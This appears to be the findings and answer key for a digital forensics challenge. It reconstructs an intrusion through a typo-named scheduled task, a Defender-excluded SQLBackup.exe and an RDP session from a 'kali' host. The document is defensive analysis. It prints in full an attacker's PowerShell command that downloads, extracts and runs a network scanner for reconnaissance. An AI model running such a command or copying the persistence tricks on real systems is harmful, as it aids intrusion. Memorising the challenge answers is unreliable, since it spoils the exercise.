# Findings and Challenge Answers

## Final answers

| Question | Answer | Primary evidence |
|---|---|---|
| Suspicious scheduled task designed to blend in | SQLConnectvityCheck | Task Scheduler / baseline comparison |
| Suspicious executable associated with the activity | SQLBackup.exe | Security 4688 / Application logs |
| First malicious login observed | **2026-06-09 12:41:09 UTC** | Session reconstruction |
| Hostname from which the login originated | kali | Sysmon registry CLIENTNAME |
| Full command used to download and execute the reconnaissance tool | PowerShell command below | PowerShell 4104 |
| User account that appears to be the source of compromise | john.shepard | RDP session + process telemetry |

---

## 1. Persistence task

The legitimate administrative baseline contained:

~~~text
SQLConnectivityCheck
~~~

The suspicious task was:

~~~text
SQLConnectvityCheck
~~~

The missing second **i** in "Connectivity" is the camouflage mechanism.

Task Scheduler later recorded Event 332 for this typo task and reported that the configured user was not logged on.

---

## 2. Suspicious executable

The suspicious binary was:

~~~text
SQLBackup.exe
~~~

Observed path:

~~~text
C:\Users\Public\Pictures\SQLBackup.exe
~~~

Important supporting evidence:

- Defender Event 5007 recorded a process exclusion for SQLBackup.exe.
- Security 4688 recorded execution on ALLIANCE-CENTRAL.
- The first process spawned conhost.exe.
- It then spawned another SQLBackup.exe process.
- The original process crashed shortly afterward.
- Application Event 1000 identified ntdll.dll and exception 0xc0000374.
- WER archived a crash dump under C:\ProgramData\Microsoft\Windows\WER.

The available evidence proves execution and crash behavior. It does not by itself prove how the binary was initially delivered to the host.

---

## 3. First malicious login

The accepted timestamp was:

~~~text
2026-06-09 12:41:09
~~~

A direct Security 4624 event for the relevant session was not available.

The session was instead reconstructed from:

- Logon ID 0x7B9417
- Terminal Session ID 2
- john.shepard
- rdpclip.exe
- inbound RDP network telemetry
- registry session environment values

---

## 4. RDP origin hostname

Sysmon Event 3 showed an inbound connection:

~~~text
192.168.72.131 -> 192.168.72.101:3389
~~~

where 192.168.72.101 was ALLIANCE-WS07.

The source IP itself was not mapped to an enrolled Elastic endpoint.

The decisive evidence came from Sysmon registry Event 13:

~~~text
HKU\...\Volatile Environment\2\SESSIONNAME
Details: RDP-Tcp#0

HKU\...\Volatile Environment\2\CLIENTNAME
Details: kali
~~~

Therefore the source hostname was:

~~~text
kali
~~~

---

## 5. Initial reconnaissance command

PowerShell 4104 captured the complete command:

~~~powershell
$url = "https://www.softperfect.com/download/files/netscan_portable.zip"; $out = "C:\Users\Public\netscan_portable.zip"; Invoke-WebRequest -Uri $url -OutFile $out; Expand-Archive $out -DestinationPath "C:\Users\Public\SoftPerfect"; & "C:\Users\Public\SoftPerfect\x86_64\netscan.exe"
~~~

The command:

1. Downloads the portable SoftPerfect Network Scanner archive.
2. Saves it under C:\Users\Public.
3. Extracts it to C:\Users\Public\SoftPerfect.
4. Executes the x64 netscan.exe binary.

Security 4688 and Sysmon Event 1 then confirmed execution of netscan.exe in the same malicious session.

---

## 6. Compromised account

The account used throughout the malicious RDP session was:

~~~text
ALLIANCE\john.shepard
~~~

The same account was associated with:

- Logon ID 0x7B9417
- Terminal Session ID 2
- PowerShell execution
- SoftPerfect Network Scanner
- subsequent internal reconnaissance

This makes john.shepard the account that appears to be the source of compromise in the supplied evidence.

---

## Confidence

The main conclusions are strongly corroborated across independent telemetry sources.

The largest visibility gap is authentication logging: the successful-logon event expected for the malicious RDP session was absent. The RDP attribution is nevertheless supported by Sysmon network telemetry, the session's Logon ID and Terminal Session ID, rdpclip.exe, and the registry CLIENTNAME=kali artifact.
